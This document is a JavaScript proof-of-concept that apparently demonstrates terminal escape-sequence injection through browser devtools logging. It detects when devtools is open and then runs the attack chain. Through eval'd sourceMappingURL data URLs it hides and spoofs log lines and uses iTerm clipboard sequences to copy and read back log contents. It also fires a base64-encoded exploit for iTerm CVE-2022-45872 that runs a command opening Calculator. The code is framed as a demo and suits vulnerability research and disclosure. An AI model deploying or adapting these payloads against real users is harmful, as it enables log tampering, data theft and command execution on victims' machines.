// Detect devtools, then run the demo
let devtoolsOpen = false;

function checkDevtools() {
  if (devtoolsOpen) return;
  const detect = ["a"];
  detectCount = -1;

  detect.__defineGetter__("0", () => detectCount++);

  console.table([], detect);

  if (detectCount) {
    devtoolsOpen = true;
    main();
  }
}

window.onload = () => setInterval(checkDevtools, 100); // prints a line to console where unescaped %s is defined by us:
// [...:ERROR:CONSOLE(1)] "Uncaught (in promise) TypeError: Cannot use 'in' operator to search for 'sections' in %s", source: devtools://devtools/bundled/core/sdk/sdk.js (1)


function log(s) {
  eval("//# sourceMappingURL=data:text/plain;base64," + btoa(JSON.stringify(s)));
}

function main() {
  const pre = document.querySelector("pre");
  const ESC = "\x1b";
  const resetColors = `${ESC}[0;0m`;
  const invisibleColors = `${ESC}[38;2;21;24;29;48;2;21;24;29m`;
  const newlineReset = `\n${ESC}[0F${ESC}[0J${resetColors}`; // iTerm CVE-2022-45872, opens Calculator

  const iTermCalc = atob("G1swbRtQJHEDG1wgG1AkcW07b3BlbiAtYSBDYWxjdWxhdG9yDRtcIBtQJHFtG1w=");
  pre.innerText = "Running demo"; // Basic terminal injection, works everywhere

  setTimeout(() => log(`${resetColors}${ESC}[1F${ESC}[0JBasic terminal injection: ${ESC}[1;31mhiding and spoofing logs!${invisibleColors}`), 0);
  setTimeout(() => log(`${newlineReset}Bell sound!\x07${invisibleColors}`), 3000); // iTerm clipboard escape sequences, works on latest iTerm

  setTimeout(() => log(`${newlineReset}Stealing logs with iTerm clipboard...${invisibleColors}${ESC}]1337;CopyToClipboard=\x07`), 4000); // Create a random log entry, in a real attack this would contain sensitive info

  setTimeout(() => eval("//# sourceMappingURL=a://a"), 5000);
  setTimeout(() => log(`${ESC}]1337;EndCopy\x07${newlineReset}Copied to clipboard!${invisibleColors}`), 6000);
  setTimeout(async () => pre.innerText = await navigator.clipboard.readText(), 7000); // iTerm RCE, only works on outdated iTerm

  setTimeout(() => log(`${newlineReset}iTerm CVE-2022-45872${invisibleColors}`), 12000);
  setTimeout(() => log(`${newlineReset}${iTermCalc}${ESC}[1;30;1;40m`), 13000);
}